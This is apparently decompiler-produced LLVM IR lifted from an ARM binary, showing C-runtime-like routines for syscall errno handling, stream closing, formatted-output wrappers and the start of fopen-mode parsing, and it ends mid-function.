define i32 @function_cfcc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cfcc:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cfcc = load i32, i32* @r7, align 4
  store i32 %v3_cfcc, i32* %stack_var_-8, align 4
  %v0_cfd8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_cfd8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_cfd8, -4095
  br i1 %tmp, label %dec_label_pc_cff8, label %dec_label_pc_cfe8

dec_label_pc_cfe8:                                ; preds = %dec_label_pc_cfcc
  %v0_cfe8 = call i32 @function_d0ec()
  %v0_cfec = load i32, i32* %r7.global-to-local, align 4
  %v1_cfec = sub i32 0, %v0_cfec
  %v2_cff0 = inttoptr i32 %v0_cfe8 to i32*
  store i32 %v1_cfec, i32* %v2_cff0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_cff8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_cff8

dec_label_pc_cff8:                                ; preds = %dec_label_pc_cfcc, %dec_label_pc_cfe8
  %v1_cffc = phi i32 [ %v0_cfd8, %dec_label_pc_cfcc ], [ -1, %dec_label_pc_cfe8 ]
  %v2_cff8 = phi i32 [ %v3_cfcc, %dec_label_pc_cfcc ], [ %v2_cff8.pre, %dec_label_pc_cfe8 ]
  store i32 %v2_cff8, i32* @r7, align 4
  ret i32 %v1_cffc

; uselistorder directives
  uselistorder i32 %v0_cfd8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cff8, { 1, 0 }
}

define i32 @function_d000(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d000:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d000 = load i32, i32* @r7, align 4
  store i32 %v3_d000, i32* %stack_var_-8, align 4
  %v0_d00c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d00c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d00c, -4095
  br i1 %tmp, label %dec_label_pc_d02c, label %dec_label_pc_d01c

dec_label_pc_d01c:                                ; preds = %dec_label_pc_d000
  %v0_d01c = call i32 @function_d0ec()
  %v0_d020 = load i32, i32* %r7.global-to-local, align 4
  %v1_d020 = sub i32 0, %v0_d020
  %v2_d024 = inttoptr i32 %v0_d01c to i32*
  store i32 %v1_d020, i32* %v2_d024, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_d02c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_d02c

dec_label_pc_d02c:                                ; preds = %dec_label_pc_d000, %dec_label_pc_d01c
  %v1_d030 = phi i32 [ %v0_d00c, %dec_label_pc_d000 ], [ -1, %dec_label_pc_d01c ]
  %v2_d02c = phi i32 [ %v3_d000, %dec_label_pc_d000 ], [ %v2_d02c.pre, %dec_label_pc_d01c ]
  store i32 %v2_d02c, i32* @r7, align 4
  ret i32 %v1_d030

; uselistorder directives
  uselistorder i32 %v0_d00c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d02c, { 1, 0 }
}

define i32 @function_d034(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d034:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_d034 = load i32, i32* @r3, align 4
  store i32 %v9_d034, i32* %stack_var_-4, align 4
  %v2_d040 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d040, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_d074, label %dec_label_pc_d064

dec_label_pc_d064:                                ; preds = %dec_label_pc_d034
  %v0_d064 = call i32 @function_d0ec()
  %v0_d068 = load i32, i32* %r7.global-to-local, align 4
  %v1_d068 = sub i32 0, %v0_d068
  store i32 %v1_d068, i32* @r3, align 4
  %v2_d06c = inttoptr i32 %v0_d064 to i32*
  store i32 %v1_d068, i32* %v2_d06c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d074

dec_label_pc_d074:                                ; preds = %dec_label_pc_d034, %dec_label_pc_d064
  %v0_d074 = phi i32 [ %arg1, %dec_label_pc_d034 ], [ -1, %dec_label_pc_d064 ]
  ret i32 %v0_d074

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d074, { 1, 0 }
}

define i32 @function_d088(i32 %arg1) local_unnamed_addr {
dec_label_pc_d088:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d088 = load i32, i32* @r7, align 4
  store i32 %v3_d088, i32* %stack_var_-8, align 4
  %v0_d094 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d094, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d094, -4095
  br i1 %tmp, label %dec_label_pc_d0b4, label %dec_label_pc_d0a4

dec_label_pc_d0a4:                                ; preds = %dec_label_pc_d088
  %v0_d0a4 = call i32 @function_d0ec()
  %v0_d0a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_d0a8 = sub i32 0, %v0_d0a8
  %v2_d0ac = inttoptr i32 %v0_d0a4 to i32*
  store i32 %v1_d0a8, i32* %v2_d0ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_d0b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_d0b4

dec_label_pc_d0b4:                                ; preds = %dec_label_pc_d088, %dec_label_pc_d0a4
  %v1_d0b8 = phi i32 [ %v0_d094, %dec_label_pc_d088 ], [ -1, %dec_label_pc_d0a4 ]
  %v2_d0b4 = phi i32 [ %v3_d088, %dec_label_pc_d088 ], [ %v2_d0b4.pre, %dec_label_pc_d0a4 ]
  store i32 %v2_d0b4, i32* @r7, align 4
  ret i32 %v1_d0b8

; uselistorder directives
  uselistorder i32 %v0_d094, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d0b4, { 1, 0 }
}

define i32 @function_d0bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_d0bc:
  %v1_d0c0 = add i32 %arg1, 128
  %v2_d0c4 = icmp ugt i32 %v1_d0c0, 383
  %v0_d0cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_d0c4, i32 %v0_d0cc)
  %v4_d0d4 = load i32, i32* inttoptr (i32 143300 to i32*), align 4
  %v2_d0d8 = mul i32 %arg1, 2
  %v2_d0dc = add i32 %v4_d0d4, %v2_d0d8
  %v3_d0dc = inttoptr i32 %v2_d0dc to i16*
  %v4_d0dc = load i16, i16* %v3_d0dc, align 2
  %v6_d0dc = sext i16 %v4_d0dc to i32
  ret i32 %v6_d0dc
}

define i32 @function_d0ec() local_unnamed_addr {
dec_label_pc_d0ec:
  store i32 142964, i32* @r3, align 4
  ret i32 ptrtoint (i32* @global_var_2586c.262 to i32)
}

define i32 @function_d108(i16* %arg1) local_unnamed_addr {
dec_label_pc_d108:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_d108 = load i32, i32* @r4, align 4
  store i32 %v3_d108, i32* %stack_var_-36, align 4
  %v6_d108 = load i32, i32* @r5, align 4
  %v9_d108 = load i32, i32* @r6, align 4
  %v12_d108 = load i32, i32* @r7, align 4
  %v15_d108 = load i32, i32* @r8, align 4
  %v27_d108 = load i32, i32* @lr, align 4
  %v2_d10c = add i32 %tmp, 52
  %v3_d10c = inttoptr i32 %v2_d10c to i32*
  %v4_d10c = load i32, i32* %v3_d10c, align 4
  %v1_d114 = sub i32 1, %v4_d10c
  %v2_d114 = icmp ult i32 %v4_d10c, 2
  br i1 %v2_d114, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_d108
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_d108, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_d114, %dec_label_pc_d108 ]
  %v0_d11c = phi i32 [ 0, %bb ], [ %v1_d114, %dec_label_pc_d108 ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_d11c = icmp eq i32 %v0_d11c, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 142964, i32* @r6, align 4
  br i1 %v2_d11c, label %dec_label_pc_d168, label %dec_label_pc_d130

dec_label_pc_d130:                                ; preds = %bb18
  %v4_d148 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_d148)
  %v0_d15c = load i32, i32* @r6, align 4
  %v2_d15c = add i32 %v0_d15c, 16
  %v3_d15c = inttoptr i32 %v2_d15c to i32*
  %v4_d15c = load i32, i32* %v3_d15c, align 4
  call void @__pseudo_branch(i32 %v4_d15c)
  %v0_d168.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d168

dec_label_pc_d168:                                ; preds = %bb18, %dec_label_pc_d130
  %v1_d170 = phi i32 [ %tmp, %bb18 ], [ %v0_d168.pre, %dec_label_pc_d130 ]
  %v1_d168 = inttoptr i32 %v1_d170 to i16*
  %v2_d168 = load i16, i16* %v1_d168, align 2
  %v3_d168 = zext i16 %v2_d168 to i32
  %v1_d16c = and i32 %v3_d168, 64
  %v2_d16c = icmp eq i32 %v1_d16c, 0
  br i1 %v2_d16c, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_d168
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_d168, %bb19
  %storemerge26 = phi i32 [ %v1_d170, %bb19 ], [ %v1_d16c, %dec_label_pc_d168 ]
  %v1_d174 = xor i1 %v2_d16c, true
  call void @__pseudo_cond_branch(i1 %v1_d174, i32 ptrtoint (i32* @global_var_f134.267 to i32))
  store i32 %storemerge26, i32* %sl.global-to-local, align 4
  %v0_d17c = load i32, i32* @r5, align 4
  %v1_d17c = add i32 %v0_d17c, 4
  %v2_d17c = inttoptr i32 %v1_d17c to i32*
  %v3_d17c = load i32, i32* %v2_d17c, align 4
  %v1_d180 = call i32 @function_d088(i32 %v3_d17c)
  %v0_d188 = load i32, i32* @r6, align 4
  %v2_d194 = add i32 %v0_d188, 112
  %v3_d194 = inttoptr i32 %v2_d194 to i32*
  %v4_d194 = load i32, i32* %v3_d194, align 4
  store i32 %v4_d194, i32* @r7, align 4
  %v1_d19c = load i32, i32* @r5, align 4
  %v2_d19c = add i32 %v1_d19c, 4
  %v3_d19c = inttoptr i32 %v2_d19c to i32*
  store i32 -1, i32* %v3_d19c, align 4
  %v0_d1a4 = load i32, i32* @r6, align 4
  %v2_d1a4 = add i32 %v0_d1a4, 76
  %v3_d1a4 = inttoptr i32 %v2_d1a4 to i32*
  %v4_d1a4 = load i32, i32* %v3_d1a4, align 4
  %v1_d1ac = icmp slt i32 %v1_d180, 0
  store i32 %v4_d1a4, i32* %stack_var_-80, align 4
  br i1 %v1_d1ac, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  call void @__pseudo_branch(i32 %v4_d1a4)
  %v0_d1d4 = load i32, i32* @r6, align 4
  %v2_d1d4 = add i32 %v0_d1d4, 16
  %v3_d1d4 = inttoptr i32 %v2_d1d4 to i32*
  %v4_d1d4 = load i32, i32* %v3_d1d4, align 4
  call void @__pseudo_branch(i32 %v4_d1d4)
  %v0_d1e4 = load i32, i32* @r6, align 4
  %v2_d1e4 = add i32 %v0_d1e4, 12
  %v3_d1e4 = inttoptr i32 %v2_d1e4 to i32*
  %v4_d1e4 = load i32, i32* %v3_d1e4, align 4
  %v1_d1e8 = inttoptr i32 %v4_d1e4 to i32*
  %v2_d1e8 = load i32, i32* %v1_d1e8, align 4
  %v1_d1f0 = add i32 %v2_d1e8, 1
  %v2_d1f4 = add i32 %v0_d1e4, 24
  %v3_d1f4 = inttoptr i32 %v2_d1f4 to i32*
  %v4_d1f4 = load i32, i32* %v3_d1f4, align 4
  store i32 %v4_d1f4, i32* @r4, align 4
  store i32 %v1_d1f0, i32* %v1_d1e8, align 4
  call void @__pseudo_branch(i32 %v4_d1f4)
  %v0_d20c = load i32, i32* @r5, align 4
  %v1_d20c = inttoptr i32 %v0_d20c to i16*
  %v2_d20c = load i16, i16* %v1_d20c, align 2
  %v1_d210 = and i16 %v2_d20c, 24576
  %v1_d214 = or i16 %v1_d210, 48
  %v0_d218 = load i32, i32* %sb.global-to-local, align 4
  %v2_d218 = icmp eq i32 %v0_d218, 0
  store i16 %v1_d214, i16* %v1_d20c, align 2
  br i1 %v2_d218, label %.thread, label %bb23

bb23:                                             ; preds = %bb22
  br label %.thread

.thread:                                          ; preds = %bb22, %bb23
  %v2_d22c = xor i1 %v2_d218, true
  call void @__pseudo_cond_branch(i1 %v2_d22c, i32 %v4_d1f4)
  %v0_d230 = load i32, i32* @r5, align 4
  %v1_d230 = inttoptr i32 %v0_d230 to i16*
  %v2_d230 = load i16, i16* %v1_d230, align 2
  %v1_d234 = and i16 %v2_d230, 16384
  %v2_d234 = icmp eq i16 %v1_d234, 0
  br i1 %v2_d234, label %bb25, label %bb24

bb24:                                             ; preds = %.thread
  br label %bb25

bb25:                                             ; preds = %.thread, %bb24
  %v1_d23c = xor i1 %v2_d234, true
  call void @__pseudo_cond_branch(i1 %v1_d23c, i32 ptrtoint (i32* @global_var_11048.271 to i32))
  %v2_d248 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_d248)
  call void @__pseudo_branch(i32 %v4_d1d4)
  %v0_d268 = load i32, i32* @r6, align 4
  %v2_d268 = add i32 %v0_d268, 52
  %v3_d268 = inttoptr i32 %v2_d268 to i32*
  %v4_d268 = load i32, i32* %v3_d268, align 4
  %v1_d26c = inttoptr i32 %v4_d268 to i32*
  %v2_d26c = load i32, i32* %v1_d26c, align 4
  %v1_d270 = add i32 %v2_d26c, 1
  store i32 %v1_d270, i32* %v1_d26c, align 4
  call void @__pseudo_branch(i32 %v4_d1f4)
  %v0_d288 = call i32 @function_efac()
  %v0_d28c = load i32, i32* %sl.global-to-local, align 4
  %v2_d294 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_d294, i32* @r4, align 4
  store i32 %v6_d108, i32* @r5, align 4
  store i32 %v9_d108, i32* @r6, align 4
  store i32 %v12_d108, i32* @r7, align 4
  store i32 %v15_d108, i32* @r8, align 4
  store i32 %v27_d108, i32* @lr, align 4
  ret i32 %v0_d28c

; uselistorder directives
  uselistorder i1 %v2_d234, { 1, 0 }
  uselistorder i32 %v4_d1f4, { 0, 2, 1, 3 }
  uselistorder i32 %v4_d10c, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_d168, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_d2a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_d2a0:
  %v0_d2a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d2a0, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_d2a0
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_d2a0, %bb
  %v10_d2b8 = phi i32 [ %arg1, %dec_label_pc_d2a0 ], [ 0, %bb ]
  ret i32 %v10_d2b8

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @function_d2bc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d2bc:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_d2cc = call i32 @function_d7e4()
  ret i32 %v0_d2cc
}

define i32 @function_d2dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d2dc:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 -1, i32* @r1, align 4
  %v0_d2f0 = call i32 @function_d334()
  ret i32 %v0_d2f0
}

define i32 @function_d300(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d300:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_d30c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_d30c, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_d320 = call i32 @function_d334()
  ret i32 %v0_d320

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ()* @function_d334, { 1, 0 }
}

define i32 @function_d334() local_unnamed_addr {
dec_label_pc_d334:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_d334 = load i32, i32* @r4, align 4
  %v6_d334 = load i32, i32* @r5, align 4
  %v9_d334 = load i32, i32* @r6, align 4
  %v12_d334 = load i32, i32* @r7, align 4
  %v18_d334 = load i32, i32* @sl, align 4
  %v2_d33c = ptrtoint i32* %stack_var_-112 to i32
  %v0_d340 = load i32, i32* @r0, align 4
  store i32 %v0_d340, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_d348 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_d348, i32* @r0, align 4
  %v0_d350 = load i32, i32* @r3, align 4
  store i32 %v0_d350, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  %v0_d35c = load i32, i32* @r1, align 4
  store i32 %v0_d35c, i32* @r5, align 4
  %v0_d360 = load i32, i32* @r2, align 4
  store i32 %v0_d360, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_d374 = call i32 @function_db54(i32 %v2_d348)
  %v0_d378 = load i32, i32* @r4, align 4
  %v1_d378 = sub i32 -1, %v0_d378
  %v0_d37c = load i32, i32* @r5, align 4
  %v3_d37c = icmp ult i32 %v0_d37c, %v1_d378
  br i1 %v3_d37c, label %bb26, label %bb

bb:                                               ; preds = %dec_label_pc_d334
  store i32 %v1_d378, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_d334, %bb
  %v1_d384 = phi i32 [ %v0_d37c, %dec_label_pc_d334 ], [ %v1_d378, %bb ]
  %v2_d384 = add i32 %v1_d384, %v0_d378
  %v0_d38c = load i32, i32* @r6, align 4
  %v0_d390 = load i32, i32* @r7, align 4
  %v0_d39c = load i32, i32* @sl, align 4
  %v5_d3a8 = inttoptr i32 %v0_d378 to i8*
  %v15_d3b0 = inttoptr i32 %v0_d38c to i8*
  %v16_d3b0 = call i32 @function_dd64(i32 %v2_d33c, i8* %v15_d3b0, i32 %v0_d390, i32 %v2_d384, i32 %v0_d378, i32 %v2_d384, i32 %v0_d378, i32 %v0_d378, i32 %v0_d378, i32 %v2_d384, i32 %v0_d39c)
  %v0_d3b4 = load i32, i32* @r5, align 4
  %v1_d3b4 = load i32, i32* @sl, align 4
  %v9_d3b4 = icmp eq i32 %v0_d3b4, %v1_d3b4
  br i1 %v9_d3b4, label %dec_label_pc_d3dc, label %dec_label_pc_d3c0

dec_label_pc_d3c0:                                ; preds = %bb26
  %v3_d384 = inttoptr i32 %v2_d384 to i8*
  %v9_d3c8 = icmp eq i8* %v5_d3a8, %v3_d384
  br i1 %v9_d3c8, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_d3c0
  %v2_d3cc = add i32 %v0_d378, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_d3c0, %bb27
  %v1_d3d0 = phi i32 [ %v2_d384, %dec_label_pc_d3c0 ], [ %v2_d3cc, %bb27 ]
  %v6_d3d0 = inttoptr i32 %v1_d3d0 to i8*
  %stack_var_-96.0 = select i1 %v9_d3c8, i8* %v6_d3d0, i8* %v5_d3a8
  %v1_d3d8 = trunc i32 %v1_d3b4 to i8
  store i8 %v1_d3d8, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_d3dc

dec_label_pc_d3dc:                                ; preds = %bb26, %bb28
  store i32 %v3_d334, i32* @r4, align 4
  store i32 %v6_d334, i32* @r5, align 4
  store i32 %v9_d334, i32* @r6, align 4
  store i32 %v12_d334, i32* @r7, align 4
  store i32 %v18_d334, i32* @sl, align 4
  ret i32 %v16_d3b0

; uselistorder directives
  uselistorder i32 %v2_d384, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_d378, { 2, 1, 0 }
  uselistorder i32 %v0_d378, { 2, 4, 5, 7, 3, 6, 1, 0 }
  uselistorder label %dec_label_pc_d3dc, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @function_d3e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_d3e8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d3e8 = load i32, i32* @r4, align 4
  %v6_d3e8 = load i32, i32* @r5, align 4
  %v9_d3e8 = load i32, i32* @r6, align 4
  %v12_d3e8 = load i32, i32* @lr, align 4
  store i32 142964, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_23650.276 to i32), i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_d418 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_d418)
  %v0_d42c = load i32, i32* @r5, align 4
  %v2_d42c = add i32 %v0_d42c, 16
  %v3_d42c = inttoptr i32 %v2_d42c to i32*
  %v4_d42c = load i32, i32* %v3_d42c, align 4
  call void @__pseudo_branch(i32 %v4_d42c)
  %v4_d43c = load i32, i32* @global_var_23668.280, align 4
  store i32 %v4_d43c, i32* %r4.global-to-local, align 4
  %v2_d440 = icmp eq i32 %v4_d43c, 0
  br i1 %v2_d440, label %dec_label_pc_d490, label %dec_label_pc_d448

dec_label_pc_d448:                                ; preds = %dec_label_pc_d3e8
  %v1_d448 = add i32 %v4_d43c, 4
  %v2_d448 = inttoptr i32 %v1_d448 to i32*
  %v3_d448 = load i32, i32* %v2_d448, align 4
  %v1_d44c = load i32, i32* @r6, align 4
  %v9_d44c = icmp eq i32 %v3_d448, %v1_d44c
  br i1 %v9_d44c, label %.thread, label %dec_label_pc_d45c

.thread:                                          ; preds = %dec_label_pc_d448
  %v2_d450 = inttoptr i32 %v4_d43c to i32*
  %v3_d450 = load i32, i32* %v2_d450, align 4
  store i32 %v3_d450, i32* @global_var_23668.280, align 4
  br label %dec_label_pc_d490

dec_label_pc_d45c:                                ; preds = %dec_label_pc_d448, %dec_label_pc_d47c
  %v1_d48c = phi i32 [ %v2_d460, %dec_label_pc_d47c ], [ %v4_d43c, %dec_label_pc_d448 ]
  %v1_d460 = inttoptr i32 %v1_d48c to i32*
  %v2_d460 = load i32, i32* %v1_d460, align 4
  store i32 %v2_d460, i32* %r4.global-to-local, align 4
  %v2_d464 = icmp eq i32 %v2_d460, 0
  br i1 %v2_d464, label %dec_label_pc_d46c, label %dec_label_pc_d47c

dec_label_pc_d46c:                                ; preds = %dec_label_pc_d45c
  %v0_d46c = call i32 @function_d0ec()
  %v2_d474 = inttoptr i32 %v0_d46c to i32*
  store i32 22, i32* %v2_d474, align 4
  br label %dec_label_pc_d490

dec_label_pc_d47c:                                ; preds = %dec_label_pc_d45c
  %v1_d47c = add i32 %v2_d460, 4
  %v2_d47c = inttoptr i32 %v1_d47c to i32*
  %v3_d47c = load i32, i32* %v2_d47c, align 4
  %v9_d480 = icmp eq i32 %v3_d47c, %v1_d44c
  br i1 %v9_d480, label %dec_label_pc_d488, label %dec_label_pc_d45c

dec_label_pc_d488:                                ; preds = %dec_label_pc_d47c
  %v1_d488 = inttoptr i32 %v2_d460 to i32*
  %v2_d488 = load i32, i32* %v1_d488, align 4
  store i32 %v2_d488, i32* %v1_d460, align 4
  br label %dec_label_pc_d490

dec_label_pc_d490:                                ; preds = %.thread, %dec_label_pc_d3e8, %dec_label_pc_d46c, %dec_label_pc_d488
  %v0_d49c = load i32, i32* @r5, align 4
  %v2_d49c = add i32 %v0_d49c, 24
  %v3_d49c = inttoptr i32 %v2_d49c to i32*
  %v4_d49c = load i32, i32* %v3_d49c, align 4
  store i32 54440, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_d49c)
  %v0_d4a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_d4a8 = icmp eq i32 %v0_d4a8, 0
  br i1 %v2_d4a8, label %dec_label_pc_d4f8, label %dec_label_pc_d4b0

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d490
  store i32 %v0_d4a8, i32* @r0, align 4
  %v1_d4b4 = add i32 %v0_d4a8, 8
  %v2_d4b4 = inttoptr i32 %v1_d4b4 to i32*
  %v3_d4b4 = load i32, i32* %v2_d4b4, align 4
  store i32 %v3_d4b4, i32* @r4, align 4
  %v0_d4b8 = call i32 @function_11048()
  %v0_d4bc = load i32, i32* @r6, align 4
  %v1_d4c0 = inttoptr i32 %v0_d4bc to i16*
  %v2_d4c0 = call i32 @function_d108(i16* %v1_d4c0)
  %v2_d4c4 = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_d4c8

dec_label_pc_d4c8:                                ; preds = %dec_label_pc_d4e4, %dec_label_pc_d4b0
  %v0_d4d0 = load i32, i32* @r4, align 4
  store i32 %v0_d4d0, i32* @r0, align 4
  %v3_d4d4 = call i32 @function_cf3c(i32 %v0_d4d0, i32 %v2_d4c4, i32 0)
  %v1_d4d8 = icmp slt i32 %v3_d4d4, 0
  br i1 %v1_d4d8, label %dec_label_pc_d4e4, label %dec_label_pc_d4f8.loopexit

dec_label_pc_d4e4:                                ; preds = %dec_label_pc_d4c8
  %v0_d4e4 = call i32 @function_d0ec()
  %v1_d4e8 = inttoptr i32 %v0_d4e4 to i32*
  %v2_d4e8 = load i32, i32* %v1_d4e8, align 4
  %v7_d4ec = icmp eq i32 %v2_d4e8, 4
  br i1 %v7_d4ec, label %dec_label_pc_d4c8, label %dec_label_pc_d4f8

dec_label_pc_d4f8.loopexit:                       ; preds = %dec_label_pc_d4c8
  %v6_d4dc = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_d4f8

dec_label_pc_d4f8:                                ; preds = %dec_label_pc_d4e4, %dec_label_pc_d490, %dec_label_pc_d4f8.loopexit
  %storemerge = phi i32 [ %v6_d4dc, %dec_label_pc_d4f8.loopexit ], [ -1, %dec_label_pc_d490 ], [ -1, %dec_label_pc_d4e4 ]
  store i32 %v3_d3e8, i32* %r4.global-to-local, align 4
  store i32 %v6_d3e8, i32* @r5, align 4
  store i32 %v9_d3e8, i32* @r6, align 4
  store i32 %v12_d3e8, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_d4a8, { 1, 0, 2 }
  uselistorder i32 %v2_d460, { 0, 2, 3, 4, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_d4f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d490, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_d45c, { 1, 0 }
}

define i32 @function_d508(i64* %arg1) local_unnamed_addr {
dec_label_pc_d508:
  %v0_d508 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d508, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_d508
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_d508
  %tmp = ptrtoint i64* %arg1 to i32
  ret i32 %tmp
}

define i32 @function_d520(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_d520:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d520 = load i32, i32* @r4, align 4
  store i32 %v3_d520, i32* %stack_var_-20, align 4
  %v6_d520 = load i32, i32* @r5, align 4
  %v9_d520 = load i32, i32* @r6, align 4
  %v12_d520 = load i32, i32* @r7, align 4
  %v15_d520 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_d528 = load i8, i8* %arg2, align 1
  %v4_d528 = zext i8 %v3_d528 to i32
  store i32 %v4_d528, i32* %r3.global-to-local, align 4
  %v7_d534 = icmp eq i8 %v3_d528, 119
  br i1 %v7_d534, label %dec_label_pc_d570, label %dec_label_pc_d548

dec_label_pc_d548:                                ; preds = %dec_label_pc_d520
  %v7_d548 = icmp eq i8 %v3_d528, 114
  br i1 %v7_d548, label %bb, label %dec_label_pc_d558

bb:                                               ; preds = %dec_label_pc_d548
  store i32 1, i32* %r2.global-to-local, align 4
